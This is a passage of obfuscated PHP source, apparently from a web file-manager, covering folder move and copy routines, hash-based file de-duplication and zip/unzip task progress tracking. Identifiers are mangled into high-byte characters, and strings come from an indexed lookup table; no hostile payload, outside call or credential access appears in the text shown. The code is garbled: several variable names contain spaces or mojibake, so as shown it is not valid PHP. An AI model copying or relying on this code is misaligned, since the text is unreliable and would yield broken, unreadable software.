$±ÎĞğ±® = $this->_childrenListSelect($úß½ë¾´); foreach ($±ÎĞğ±® as $Á¶¿êŠ¼) { $this->_move($Á¶¿êŠ¼[$ñ™¹ƒÇË[402]], $×ãùğô, $âÈ­–—¿, $§®ŠÆˆ); } $Æú“œ¦ = !0; } } else { if ($âÈ­–—¿ == REPEAT_SKIP) { $Æú“œ¦ = !0; } else { if ($âÈ­–—¿ == REPEAT_RENAME || $âÈ­–—¿ == REPEAT_RENAME_FOLDER) { $ ¨Ò´† = $this->fileNameAuto($İáØñç, $ ¨Ò´†, $âÈ­–—¿, $î¶óÌ†œ); $¿ ûÏ¾’ = $this->_moveForce($úß½ë¾´, $İáØñç, $ ¨Ò´†); } else { if ($âÈ­–—¿ == REPEAT_REPLACE) { $€ÕÁ = $this->sourceInfoCache($×ãùğô); $”éÙ´è = $this->fileHistory($€ÕÁ, $½§”Â÷Œ[$ñ™¹ƒÇË[468]], $½§”Â÷Œ[$ñ™¹ƒÇË[76]]); $Æú“œ¦ = !0; if ($”éÙ´è) { $§®ŠÆˆ[$ñ™¹ƒÇË[566]][] = $½§”Â÷Œ[$ñ™¹ƒÇË[468]]; } } } } } if ($Æú“œ¦ && !$§®ŠÆˆ[$ñ™¹ƒÇË[598]]) { $§®ŠÆˆ[$ñ™¹ƒÇË[598]] = !0; } return $¿ ûÏ¾’; } private function _moveForce($óÔ¯Øè, $ãõ‡Çí´, $Çºşºïæ) { $ªÇšƒğÒ =& $_SERVER[óó‹¸‚å]; $şö®¾Ò‘ = $this->sourceInfo($óÔ¯Øè); $Ì°¨±Ñ = $this->sourceInfo($ãõ‡Çí´); $ˆë¨–Ê = $şö®¾Ò‘[$ªÇšƒğÒ[410]] == $ªÇšƒğÒ[88]; $ç±ØÇÅÛ = array($ªÇšƒğÒ[401] => $Ì°¨±Ñ[$ªÇšƒğÒ[402]], $ªÇšƒğÒ[590] => $Ì°¨±Ñ[$ªÇšƒğÒ[521]] . $Ì°¨±Ñ[$ªÇšƒğÒ[402]] . $ªÇšƒğÒ[50], $ªÇšƒğÒ[586] => $Ì°¨±Ñ[$ªÇšƒğÒ[411]], $ªÇšƒğÒ[587] => $Ì°¨±Ñ[$ªÇšƒğÒ[505]], $ªÇšƒğÒ[589] => USER_ID, $ªÇšƒğÒ[420] => $Çºşºïæ); $®ëé¾Ş¥ = $şö®¾Ò‘[$ªÇšƒğÒ[411]] == SourceModel::TYPE_GROUP && $Ì°¨±Ñ[$ªÇšƒğÒ[411]] == SourceModel::TYPE_GROUP && $şö®¾Ò‘[$ªÇšƒğÒ[505]] == $Ì°¨±Ñ[$ªÇšƒğÒ[505]]; if (!$®ëé¾Ş¥ && $this->moveClearAuth) { Model($ªÇšƒğÒ[502])->authClear($óÔ¯Øè); } $¯ÁÆ¿üê = $şö®¾Ò‘[$ªÇšƒğÒ[431]] == $ªÇšƒğÒ[88] && $Ì°¨±Ñ[$ªÇšƒğÒ[431]] != $ªÇšƒğÒ[88]; if ($¯ÁÆ¿üê) { $ç±ØÇÅÛ[$ªÇšƒğÒ[430]] = 0; } if ($ˆë¨–Ê) { $€«ƒ„½” = array($ªÇšƒğÒ[590] => array($ªÇšƒğÒ[550], $şö®¾Ò‘[$ªÇšƒğÒ[521]] . $şö®¾Ò‘[$ªÇšƒğÒ[402]] . $ªÇšƒğÒ[551])); $–ğ’ŸÔ = $şö®¾Ò‘[$ªÇšƒğÒ[521]] . $şö®¾Ò‘[$ªÇšƒğÒ[402]] . $ªÇšƒğÒ[50]; $Õ ¸•‡­ = $Ì°¨±Ñ[$ªÇšƒğÒ[521]] . $Ì°¨±Ñ[$ªÇšƒğÒ[402]] . $ªÇšƒğÒ[50] . $şö®¾Ò‘[$ªÇšƒğÒ[402]] . $ªÇšƒğÒ[50]; $Åòàğ†• = array($ªÇšƒğÒ[590] => array($ªÇšƒğÒ[599], "\x72\145\160\x6c\x61\x63\x65\x28\160\x61\162\x65\x6e\x74\x4c\x65\166\145\154\54\x27{$–ğ’ŸÔ}\47\x2c\x27{$Õ ¸•‡­}\47\x29"), $ªÇšƒğÒ[586] => $Ì°¨±Ñ[$ªÇšƒğÒ[411]], $ªÇšƒğÒ[587] => $Ì°¨±Ñ[$ªÇšƒğÒ[505]]); if ($¯ÁÆ¿üê) { $Åòàğ†•[$ªÇšƒğÒ[430]] = 0; } $this->where($€«ƒ„½”)->data($Åòàğ†•)->save(); } $this->where(array($ªÇšƒğÒ[417] => $óÔ¯Øè))->data($ç±ØÇÅÛ)->save(); return $óÔ¯Øè; } private function clearShare($‚¦Í×ï½, $Ã»‡şĞ) { $Á¸¨ÊõÑ =& $_SERVER[óó‹¸‚å]; $æàÅÅ¹í = $this->sourceInfo($‚¦Í×ï½); $„€ğìµş = $this->sourceInfo($Ã»‡şĞ); if ($æàÅÅ¹í[$Á¸¨ÊõÑ[505]] == $„€ğìµş[$Á¸¨ÊõÑ[505]] && $æàÅÅ¹í[$Á¸¨ÊõÑ[411]] == $Á¸¨ÊõÑ[600]) { return; } $ƒ²ûº€Ü = array($Á¸¨ÊõÑ[521] => array($Á¸¨ÊõÑ[550], $æàÅÅ¹í[$Á¸¨ÊõÑ[521]] . $‚¦Í×ï½ . $Á¸¨ÊõÑ[551])); $œßÆ„Äœ = $this->field($Á¸¨ÊõÑ[417])->where($ƒ²ûº€Ü)->getField($Á¸¨ÊõÑ[402], !0); if (!$œßÆ„Äœ) { return; } $ƒ²ûº€Ü = array($Á¸¨ÊõÑ[402] => array($Á¸¨ÊõÑ[7], $œßÆ„Äœ), $Á¸¨ÊõÑ[496] => 1); $ÙƒÛ³ô„ = Model($Á¸¨ÊõÑ[601])->field($Á¸¨ÊõÑ[489])->where($ƒ²ûº€Ü)->select(); if (!$ÙƒÛ³ô„) { return; } $ÙƒÛ³ô„ = array_to_keyvalue($ÙƒÛ³ô„, $Á¸¨ÊõÑ[12], $Á¸¨ÊõÑ[489]); $ƒ²ûº€Ü = array($Á¸¨ÊõÑ[489] => array($Á¸¨ÊõÑ[7], $ÙƒÛ³ô„)); Model($Á¸¨ÊõÑ[601])->where($ƒ²ûº€Ü)->save(array($Á¸¨ÊõÑ[496] => 0)); Model($Á¸¨ÊõÑ[602])->where($ƒ²ûº€Ü)->delete(); } public function copyFolderFromIO($üì’ËÂ, $¡ï‰à™, $—¬ş¨õò, $Íœª·¢, $¥ŸÁİÕê, $²Î„‚Ã = false) { $ÆŸ’ =& $_SERVER[óó‹¸‚å]; $Ú“”úê = array($ÆŸ’[567] => array(), $ÆŸ’[568] => array(), $ÆŸ’[566] => array(), $ÆŸ’[603] => array()); $¸”³†¦ï = $²Î„‚Ã ? $²Î„‚Ã : $üì’ËÂ->pathThis($¡ï‰à™); $‹¨ˆŠÈï = $this->fileNameExist($—¬ş¨õò, $¸”³†¦ï); $¼ÃğœÆ§ = $this->mkdir($—¬ş¨õò, $¸”³†¦ï, $Íœª·¢); if (!$‹¨ˆŠÈï || $Íœª·¢ == REPEAT_RENAME_FOLDER) { $Íœª·¢ = !1; } if ($‹¨ˆŠÈï) { $this->_childrenAllMake($‹¨ˆŠÈï); } Hook::trigger($ÆŸ’[604]); $this->_copyChildTo($üì’ËÂ, $¡ï‰à™, $¼ÃğœÆ§, $Íœª·¢, $Ú“”úê, $¥ŸÁİÕê); Hook::trigger($ÆŸ’[605]); if ($¼ÃğœÆ§) { $this->folderSizeResetChildren($¼ÃğœÆ§); } $this->_childrenListClear(); Model($ÆŸ’[569])->addAll($Ú“”úê[$ÆŸ’[567]], array(), !0); Model($ÆŸ’[570])->eventCopy($¼ÃğœÆ§); $this->saveAll($Ú“”úê[$ÆŸ’[568]]); Model($ÆŸ’[471])->linkAdd($Ú“”úê[$ÆŸ’[566]]); Model($ÆŸ’[471])->remove($Ú“”úê[$ÆŸ’[603]]); $this->folderSizeReset($—¬ş¨õò); $this->updateModifyTime($—¬ş¨õò); return $¼ÃğœÆ§; } private function _copyChildTo($ƒÃªİ“Ø, $«¾™Ïšà, $­åÜüï, $½µÉğ·Í, &$¿¢ı¦Ú¸, $ˆ©ğ–ŒÈ) { $àá½Ğ» =& $_SERVER[óó‹¸‚å]; $Şù€úêÃ = $this->sourceInfoCache($­åÜüï); $ÄÉìÍœ = $ƒÃªİ“Ø->listPath($«¾™Ïšà); $ÄÉìÍœ = $ÄÉìÍœ ? $ÄÉìÍœ : array($àá½Ğ»[83] => array(), $àá½Ğ»[82] => array()); $ƒÜ€¡ºĞ = array_merge($ÄÉìÍœ[$àá½Ğ»[83]], $ÄÉìÍœ[$àá½Ğ»[82]]); $Â¸ÌØÏ = $this->_addFiles($ƒÃªİ“Ø, $ÄÉìÍœ[$àá½Ğ»[83]], $ˆ©ğ–ŒÈ); $ë©¡×Œ = array(); foreach ($ƒÜ€¡ºĞ as &$°îÆ´éö) { if (isset($Â¸ÌØÏ[$°îÆ´éö[$àá½Ğ»[32]]])) { $°îÆ´éö = $Â¸ÌØÏ[$°îÆ´éö[$àá½Ğ»[32]]]; } $°îÆ´éö[$àá½Ğ»[410]] = $°îÆ´éö[$àá½Ğ»[33]] == $àá½Ğ»[75]; $°îÆ´éö[$àá½Ğ»[412]] = substr(_get($°îÆ´éö, $àá½Ğ»[174], $àá½Ğ»[12]), 0, 10); $°îÆ´éö[$àá½Ğ»[76]] = _get($°îÆ´éö, $àá½Ğ»[76], 0); $°îÆ´éö[$àá½Ğ»[468]] = _get($°îÆ´éö, $àá½Ğ»[468], 0); if (!isset($°îÆ´éö[$àá½Ğ»[606]]) && $°îÆ´éö[$àá½Ğ»[468]]) { $¿¢ı¦Ú¸[$àá½Ğ»[603]][] = $°îÆ´éö[$àá½Ğ»[468]]; } if ($½µÉğ·Í) { $¥°¡È†Å = $this->fileNameExistCache($­åÜüï, $°îÆ´éö[$àá½Ğ»[32]]); if ($¥°¡È†Å) { if ($°îÆ´éö[$àá½Ğ»[410]] || $½µÉğ·Í == REPEAT_SKIP) { continue; } if ($½µÉğ·Í == REPEAT_REPLACE) { $©ÊÅ¾ç = $this->sourceInfoCache($¥°¡È†Å); $æŞÈâô = $this->fileHistory($©ÊÅ¾ç, $°îÆ´éö[$àá½Ğ»[468]], $°îÆ´éö[$àá½Ğ»[76]]); if ($æŞÈâô) { $¿¢ı¦Ú¸[$àá½Ğ»[566]][] = $°îÆ´éö[$àá½Ğ»[468]]; } continue; } else { if ($½µÉğ·Í == REPEAT_RENAME) { $°îÆ´éö[$àá½Ğ»[32]] = $this->fileNameAutoCache($­åÜüï, $°îÆ´éö[$àá½Ğ»[32]], $½µÉğ·Í, !1); } } } } if (!$°îÆ´éö[$àá½Ğ»[410]] && $°îÆ´éö[$àá½Ğ»[468]] == 0) { continue; } if (!$°îÆ´éö[$àá½Ğ»[410]] && $°îÆ´éö[$àá½Ğ»[468]]) { $¿¢ı¦Ú¸[$àá½Ğ»[566]][] = $°îÆ´éö[$àá½Ğ»[468]]; } $ë©¡×Œ[] = $this->_makeItemData($°îÆ´éö, $Şù€úêÃ, $°îÆ´éö[$àá½Ğ»[32]]); } unset($°îÆ´éö); if (!empty($ë©¡×Œ)) { $this->addAll($ë©¡×Œ); $this->_childrenListSelect($­åÜüï); } $æ™ùÂ´ã = $this->_childrenList($­åÜüï); $æ™ùÂ´ã = array_to_keyvalue($æ™ùÂ´ã, $àá½Ğ»[32]); foreach ($ƒÜ€¡ºĞ as $°îÆ´éö) { $©ÊÅ¾ç = $æ™ùÂ´ã[$°îÆ´éö[$àá½Ğ»[32]]]; $ÀÛÂìó› = $©ÊÅ¾ç[$àá½Ğ»[402]]; $this->_copyApplyMeta($©ÊÅ¾ç, $¿¢ı¦Ú¸); if ($°îÆ´éö[$àá½Ğ»[33]] == $àá½Ğ»[75]) { $°îÆ´éö[$àá½Ğ»[84]] = $ƒÃªİ“Ø->getPathInner($°îÆ´éö[$àá½Ğ»[84]]); $this->_copyChildTo($ƒÃªİ“Ø, $°îÆ´éö[$àá½Ğ»[84]], $ÀÛÂìó›, $½µÉğ·Í, $¿¢ı¦Ú¸, $ˆ©ğ–ŒÈ); } } } private function _addFiles($ôÉØØä, $Õ­›¦ßè, $Ô½æˆÛ) { $¥¢ş·€ =& $_SERVER[óó‹¸‚å]; if (!$Õ­›¦ßè || count($Õ­›¦ßè) == 0) { return array(); } $â˜Ò»§’ = array(); foreach ($Õ­›¦ßè as &$¨À¹î¿™) { Hook::trigger($¥¢ş·€[607], $¨À¹î¿™); $¨À¹î¿™[$¥¢ş·€[84]] = $ôÉØØä->getPathInner($¨À¹î¿™[$¥¢ş·€[84]]); $åµáÊè¾ = $ôÉØØä->hashSimple($¨À¹î¿™[$¥¢ş·€[84]]); $ÛÃèõÕ¡ = $ôÉØØä->hashMd5($¨À¹î¿™[$¥¢ş·€[84]]); if (strlen($ÛÃèõÕ¡) > 10 && !isset($â˜Ò»§’[$ÛÃèõÕ¡])) { $â˜Ò»§’[$ÛÃèõÕ¡] = array(); } $¨À¹î¿™[$¥¢ş·€[177]] = $åµáÊè¾; $¨À¹î¿™[$¥¢ş·€[176]] = $ÛÃèõÕ¡; $â˜Ò»§’[$ÛÃèõÕ¡][] =& $¨À¹î¿™; if (count($â˜Ò»§’[$ÛÃèõÕ¡]) > 1) { $¨À¹î¿™[$¥¢ş·€[606]] = !0; } Hook::trigger($¥¢ş·€[608], $¨À¹î¿™); } unset($¨À¹î¿™); $è·ö¡«ê = array($¥¢ş·€[176] => array($¥¢ş·€[7], array_keys($â˜Ò»§’))); $âŠš¦µ = Model($¥¢ş·€[609]); $Õšé¹­õ = $âŠš¦µ->where($è·ö¡«ê)->select(); $Õšé¹­õ = $Õšé¹­õ ? $Õšé¹­õ : array(); foreach ($Õšé¹­õ as $íè£¥µ‰) { if (!isset($â˜Ò»§’[$íè£¥µ‰[$¥¢ş·€[176]]])) { continue; } $üïï‡ê = $â˜Ò»§’[$íè£¥µ‰[$¥¢ş·€[176]]]; foreach ($üïï‡ê as &$¨À¹î¿™) { $¨À¹î¿™[$¥¢ş·€[468]] = $íè£¥µ‰[$¥¢ş·€[468]]; $¨À¹î¿™[$¥¢ş·€[606]] = !0; } unset($¨À¹î¿™); } $¤ğùÊıÍ = array(); foreach ($Õ­›¦ßè as $¶ôí¨“ü) { Hook::trigger($¥¢ş·€[610], $¶ôí¨“ü); if (isset($¶ôí¨“ü[$¥¢ş·€[606]]) && $¶ôí¨“ü[$¥¢ş·€[606]]) { Hook::trigger($¥¢ş·€[611], $¶ôí¨“ü); continue; } $‘Àƒ¬Î = $ôÉØØä->getPathInner($¶ôí¨“ü[$¥¢ş·€[84]]); $Î´‰¦¬Ä = $âŠš¦µ->addFileMake($‘Àƒ¬Î, $¶ôí¨“ü[$¥¢ş·€[76]], $¶ôí¨“ü[$¥¢ş·€[177]], $¶ôí¨“ü[$¥¢ş·€[176]], $¶ôí¨“ü[$¥¢ş·€[32]], $Ô½æˆÛ); Hook::trigger($¥¢ş·€[611], $¶ôí¨“ü); if (!is_array($Î´‰¦¬Ä)) { continue; } $¤ğùÊıÍ[] = $Î´‰¦¬Ä; } $âŠš¦µ->addAll($¤ğùÊıÍ); $è·ö¡«ê = array($¥¢ş·€[176] => array($¥¢ş·€[7], array_keys($â˜Ò»§’))); $Õšé¹­õ = $âŠš¦µ->where($è·ö¡«ê)->select(); $Õšé¹­õ = $Õšé¹­õ ? $Õšé¹­õ : array(); foreach ($Õšé¹­õ as $íè£¥µ‰) { if (!isset($â˜Ò»§’[$íè£¥µ‰[$¥¢ş·€[176]]])) { continue; } $•õè€¡È =& $â˜Ò»§’[$íè£¥µ‰[$¥¢ş·€[176]]]; foreach ($•õè€¡È as &$¨À¹î¿™) { $¨À¹î¿™[$¥¢ş·€[468]] = $íè£¥µ‰[$¥¢ş·€[468]]; } unset($¨À¹î¿™); } $³úÓÔ¶‡ = array(); foreach ($Õ­›¦ßè as $ğÆññú) { $³úÓÔ¶‡[$ğÆññú[$¥¢ş·€[32]]] = $ğÆññú; } return $³úÓÔ¶‡; } } goto aã¶­¹ƒÏ¦; FØªğèÃòÍ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÒÖúªã¾, $ÓËó‘²Ò = 5.0) { if (!$ÒÖúªã¾) { return; } $–‰êé¿ = Cache::get($ÒÖúªã¾); if (!$–‰êé¿ || timeFloat() - floatVal($–‰êé¿) >= $ÓËó‘²Ò) { Cache::set($ÒÖúªã¾, timeFloat(), $ÓËó‘²Ò * 10); return !0; } return !1; } public static function timeLimitCall($¿¨“Î§, $¤·ÁÄç–, $ş•ó×, $Ïá¥å½ç = 5.0) { $î¦ßÁ =& $_SERVER[óó‹¸‚å]; if (!$¿¨“Î§ || !$¤·ÁÄç–) { return; } self::$asyncAdd = !0; $¼¼•Í¤ = $î¦ßÁ[1777]; $’ÉÄÂõÀ = Cache::get($¼¼•Í¤, !0); $Ã¦Ó—” = array($î¦ßÁ[1778] => timeFloat(), $î¦ßÁ[1779] => timeFloat(), $î¦ßÁ[264] => $¤·ÁÄç–, $î¦ßÁ[1772] => $ş•ó×, $î¦ßÁ[203] => $Ïá¥å½ç); if (is_array($’ÉÄÂõÀ[$¿¨“Î§])) { $Ã¦Ó—”[$î¦ßÁ[1779]] = $’ÉÄÂõÀ[$¿¨“Î§][$î¦ßÁ[1779]]; } if (is_array($’ÉÄÂõÀ[$¿¨“Î§])) { if (timeFloat() - $’ÉÄÂõÀ[$¿¨“Î§][$î¦ßÁ[1778]] < $Ã¦Ó—”[$î¦ßÁ[203]] * 0.3) { return; } $Ã¦Ó—”[$î¦ßÁ[1779]] = $’ÉÄÂõÀ[$¿¨“Î§][$î¦ßÁ[1779]]; } $’ÉÄÂõÀ[$¿¨“Î§] = $Ã¦Ó—”; Cache::set($¼¼•Í¤, $’ÉÄÂõÀ, 60); Cache::removeMemory($¼¼•Í¤); write_log($î¦ßÁ[1780] . $¿¨“Î§ . $î¦ßÁ[71] . $¤·ÁÄç–, $î¦ßÁ[1774]); } public static function timeLimitCallLoop() { $‡œ³º®í =& $_SERVER[óó‹¸‚å]; $ıäé˜˜ş = array($‡œ³º®í[1781]); $Ä¤µ×Ä = in_array(strtolower(ACTION), $ıäé˜˜ş); if (!$Ä¤µ×Ä && !self::$asyncAdd) { return; } $šÖÄ…–œ = $‡œ³º®í[1777]; $‡œê™€Â = Cache::get($šÖÄ…–œ, !0); if (!$‡œê™€Â || count($‡œê™€Â) <= 0) { return; } $Şœ–­ğÓ = !1; $ÇÕÎ†Š = timeFloat(); $ó‚ Çıæ = array(); foreach ($‡œê™€Â as $è„æĞû¯ => $ø¨³Á¥Ï) { if ($ÇÕÎ†Š - $ø¨³Á¥Ï[$‡œ³º®í[1779]] > $ø¨³Á¥Ï[$‡œ³º®í[203]]) { $Şœ–­ğÓ = !0; try { Hook::apply($ø¨³Á¥Ï[$‡œ³º®í[264]], $ø¨³Á¥Ï[$‡œ³º®í[1772]]); write_log($‡œ³º®í[1782] . $è„æĞû¯ . $‡œ³º®í[71] . $ø¨³Á¥Ï[$‡œ³º®í[264]] . $‡œ³º®í[1783] . ACTION, $‡œ³º®í[1774]); } catch (Exception $‰‚´„ÈÁ) { } continue; } $ó‚ Çıæ[$è„æĞû¯] = $ø¨³Á¥Ï; } if (!$Şœ–­ğÓ) { return; } if (!$ó‚ Çıæ) { return Cache::remove($šÖÄ…–œ); } Cache::set($šÖÄ…–œ, $ó‚ Çıæ, 60); Cache::removeMemory($šÖÄ…–œ); } public static function finished($ö¦âË¨›, $ÉÂ‰‘Ş¶) { $á¿ÎœÉ =& $_SERVER[óó‹¸‚å]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($á¿ÎœÉ[264] => $ö¦âË¨›, $á¿ÎœÉ[1772] => $ÉÂ‰‘Ş¶); } private static function finishedRun() { $ò÷á·¢‰ =& $_SERVER[óó‹¸‚å]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $†‡ƒÔş‚) { try { Hook::apply($†‡ƒÔş‚[$ò÷á·¢‰[264]], $†‡ƒÔş‚[$ò÷á·¢‰[1772]]); } catch (Exception $Ñ­Ş„) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $´ï¦­ Ã =& $_SERVER[óó‹¸‚å]; parent::startAfter(); Hook::bind($´ï¦­ Ã[1784], array($this, $´ï¦­ Ã[1785])); Hook::bind($´ï¦­ Ã[1201], array($this, $´ï¦­ Ã[1786])); $”ã«ŸÛû =& $this->task; $”ã«ŸÛû[$´ï¦­ Ã[1787]] = $´ï¦­ Ã[1202]; if (!$”ã«ŸÛû[$´ï¦­ Ã[1574]]) { $”ã«ŸÛû[$´ï¦­ Ã[1574]] = LNG($´ï¦­ Ã[1788]); } } protected function endAfter() { $ğĞßÍƒ¬ =& $_SERVER[óó‹¸‚å]; parent::endAfter(); Hook::unbind($ğĞßÍƒ¬[1784], array($this, $ğĞßÍƒ¬[1785])); Hook::unbind($ğĞßÍƒ¬[1201], array($this, $ğĞßÍƒ¬[1786])); } public function updateAfter() { $ºƒüÒÂ³ =& $_SERVER[óó‹¸‚å]; $ƒÊíÁÛ =& $this->task; if (!$ƒÊíÁÛ[$ºƒüÒÂ³[790]] || !$ƒÊíÁÛ[$ºƒüÒÂ³[767]]) { return; } if ($ƒÊíÁÛ[$ºƒüÒÂ³[1787]] == $ºƒüÒÂ³[1202]) { $üäË£ú¶ = 0; if ($ƒÊíÁÛ[$ºƒüÒÂ³[1727]]) { $üäË£ú¶ = $ƒÊíÁÛ[$ºƒüÒÂ³[1728]] / $ƒÊíÁÛ[$ºƒüÒÂ³[1727]]; } $ƒÊíÁÛ[$ºƒüÒÂ³[1676]] = $üäË£ú¶ * 0.3; } else { if ($ƒÊíÁÛ[$ºƒüÒÂ³[1787]] == $ºƒüÒÂ³[313]) { $üäË£ú¶ = $ƒÊíÁÛ[$ºƒüÒÂ³[1675]] / $ƒÊíÁÛ[$ºƒüÒÂ³[790]]; $ƒÊíÁÛ[$ºƒüÒÂ³[1676]] = 0.3 + $üäË£ú¶ * 0.4; } else { if ($ƒÊíÁÛ[$ºƒüÒÂ³[1787]] == $ºƒüÒÂ³[107]) { $ù‰ İ•ú = 0; if ($ƒÊíÁÛ[$ºƒüÒÂ³[1729]] == $ºƒüÒÂ³[107]) { $ù‰ İ•ú = $ƒÊíÁÛ[$ºƒüÒÂ³[1728]]; } $üäË£ú¶ = ($ƒÊíÁÛ[$ºƒüÒÂ³[1732]] + $ù‰ İ•ú) / $ƒÊíÁÛ[$ºƒüÒÂ³[767]]; $ƒÊíÁÛ[$ºƒüÒÂ³[1676]] = 0.3 + 0.4 + $üäË£ú¶ * 0.3; } } } if ($ƒÊíÁÛ[$ºƒüÒÂ³[1676]] > 0) { $Éƒ »‘ = timeFloat() - $ƒÊíÁÛ[$ºƒüÒÂ³[1678]] - $ƒÊíÁÛ[$ºƒüÒÂ³[1681]]; $ƒÊíÁÛ[$ºƒüÒÂ³[1682]] = $Éƒ »‘ * (1 - $ƒÊíÁÛ[$ºƒüÒÂ³[1676]]) / $ƒÊíÁÛ[$ºƒüÒÂ³[1676]]; } } public function addFile($àé³ÔØÓ) { $ íÑ×€¨ =& $_SERVER[óó‹¸‚å]; $×ç×¢ùİ =& $this->task; $Å“©•¥ = IO::info($àé³ÔØÓ); $×ç×¢ùİ[$ íÑ×€¨[1725]] = $Å“©•¥[$ íÑ×€¨[32]]; $×ç×¢ùİ[$ íÑ×€¨[1727]] = $Å“©•¥[$ íÑ×€¨[76]]; $×ç×¢ùİ[$ íÑ×€¨[1728]] = 0; $×ç×¢ùİ[$ íÑ×€¨[1071]] = $ íÑ×€¨[1748]; $×ç×¢ùİ[$ íÑ×€¨[1729]] = $ íÑ×€¨[1202]; $×ç×¢ùİ[$ íÑ×€¨[767]] = $Å“©•¥[$ íÑ×€¨[76]]; $×ç×¢ùİ[$ íÑ×€¨[790]] = 1; $Ùîò„äº = 0; $×ç×¢ùİ[$ íÑ×€¨[1736]] = array($ íÑ×€¨[1737] => $Ùîò„äº + 1, $ íÑ×€¨[420] => $Å“©•¥[$ íÑ×€¨[32]], $ íÑ×€¨[84] => $Å“©•¥[$ íÑ×€¨[84]], $ íÑ×€¨[519] => $Å“©•¥[$ íÑ×€¨[519]] ? $Å“©•¥[$ íÑ×€¨[519]] : $Å“©•¥[$ íÑ×€¨[84]]); $this->update(); } public function unzipAfter($Çİğ´ÌÜ) { $Úå÷Ç„ˆ =& $_SERVER[óó‹¸‚å]; $¹“ÄÎÙ =& $this->task; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1787]] = $Úå÷Ç„ˆ[107]; $µµÎíƒó = IO::infoWithChildren($Çİğ´ÌÜ); $¿¸ìë‰µ = 0; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1736]] = array($Úå÷Ç„ˆ[1737] => $¿¸ìë‰µ + 1, $Úå÷Ç„ˆ[420] => $µµÎíƒó[$Úå÷Ç„ˆ[32]], $Úå÷Ç„ˆ[84] => $µµÎíƒó[$Úå÷Ç„ˆ[84]], $Úå÷Ç„ˆ[519] => $µµÎíƒó[$Úå÷Ç„ˆ[519]] ? $µµÎíƒó[$Úå÷Ç„ˆ[519]] : $µµÎíƒó[$Úå÷Ç„ˆ[84]]); if ($µµÎíƒó[$Úå÷Ç„ˆ[33]] == $Úå÷Ç„ˆ[199]) { $¹“ÄÎÙ[$Úå÷Ç„ˆ[790]] = 1; } else { $¹“ÄÎÙ[$Úå÷Ç„ˆ[790]] = $µµÎíƒó[$Úå÷Ç„ˆ[79]][$Úå÷Ç„ˆ[77]]; } $¹“ÄÎÙ[$Úå÷Ç„ˆ[1071]] = $Úå÷Ç„ˆ[12]; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1729]] = 0; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1675]] = 0; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1727]] = 0; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1728]] = 0; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1725]] = $Úå÷Ç„ˆ[12]; $¹“ÄÎÙ[$Úå÷Ç„ˆ[1732]] = 0; $¹“ÄÎÙ[$Úå÷Ç„ˆ[767]] = $µµÎíƒó[$Úå÷Ç„ˆ[76]]; $this->update(); self::log($Úå÷Ç„ˆ[1789] . json_encode(array($¹“ÄÎÙ, $µµÎíƒó))); } public function nameParse($ãİ’âÒò) { $òˆÔ¥«² =& $_SERVER[óó‹¸‚å]; $İ÷ÛİÁ =& $this->task; if ($İ÷ÛİÁ[$òˆÔ¥«²[1787]] == $òˆÔ¥«²[1202]) { $İ÷ÛİÁ[$òˆÔ¥«²[1787]] = $òˆÔ¥«²[313]; $İ÷ÛİÁ[$òˆÔ¥«²[1732]] = 0; $İ÷ÛİÁ[$òˆÔ¥«²[767]] = 0; } $×Í¬Ñ¢ = get_path_this($ãİ’âÒò); if (strstr($×Í¬Ñ¢, $òˆÔ¥«²[10])) { $İ÷ÛİÁ[$òˆÔ¥«²[1675]] += 1; $İ÷ÛİÁ[$òˆÔ¥«²[790]] += 1; } $İ÷ÛİÁ[$òˆÔ¥«²[1725]] = $ãİ’âÒò; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $‚«¸„–« =& $_SERVER[óó‹¸‚å]; parent::startAfter(); Hook::bind($‚«¸„–«[1790], array($this, $‚«¸„–«[1785])); $©ÃÊÒ®× =& $this->task; $©ÃÊÒ®×[$‚«¸„–«[1787]] = $‚«¸„–«[1202]; if (!$©ÃÊÒ®×[$‚«¸„–«[1574]]) { $©ÃÊÒ®×[$‚«¸„–«[1574]] = LNG($‚«¸„–«[1791]); } } protected function endAfter() { $¾×ˆÜ–Ê =& $_SERVER[óó‹¸‚å]; parent::endAfter(); Hook::unbind($¾×ˆÜ–Ê[1790], array($this, $¾×ˆÜ–Ê[1785])); } public function updateAfter() { $î§˜”©› =& $_SERVER[óó‹¸‚å]; $¸“ÙÁ¦¶ =& $this->task; if (!$¸“ÙÁ¦¶[$î§˜”©›[790]] || !$¸“ÙÁ¦¶[$î§˜”©›[767]]) { return; } if ($¸“ÙÁ¦¶[$î§˜”©›[1787]] == $î§˜”©›[1202]) { $¬§¼­– = $¸“ÙÁ¦¶[$î§˜”©›[1728]]; if ($¸“ÙÁ¦¶[$î§˜”©›[1729]] != $î§˜”©›[1202]) { $¬§¼­– = 0; } $×ô×¶ = ($¸“ÙÁ¦¶[$î§˜”©›[1732]] + $¬§¼­–) / $¸“ÙÁ¦¶[$î§˜”©›[767]]; $¸“ÙÁ¦¶[$î§˜”©›[1676]] = $×ô×¶ * 0.3; } else { if ($¸“ÙÁ¦¶[$î§˜”©›[1787]] == $î§˜”©›[313]) { $×ô×¶ = $¸“ÙÁ¦¶[$î§˜”©›[1675]] / $¸“ÙÁ¦¶[$î§˜”©›[790]]; $¸“ÙÁ¦¶[$î§˜”©›[1676]] = 0.3 + $×ô×¶ * 0.5; } else { if ($¸“ÙÁ¦¶[$î§˜”©›[1787]] == $î§˜”©›[107]) { $×ô×¶ = 0; if ($¸“ÙÁ¦¶[$î§˜”©›[1727]]) { $×ô×¶ = $¸“ÙÁ¦¶[$î§˜”©›[1728]] / $¸“ÙÁ¦¶[$î§˜”©›[1727]]; } $¸“ÙÁ¦¶[$î§˜”©›[1676]] = 0.3 + 0.5 + $×ô×¶ * 0.2; } } } if ($¸“ÙÁ¦¶[$î§˜”©›[1676]] > 0) { $×úµÕÚß = timeFloat() - $¸“ÙÁ¦¶[$î§˜”©›[1678]] - $¸“ÙÁ¦¶[$î§˜”©›[1681]]; $¸“ÙÁ¦¶[$î§˜”©›[1682]] = 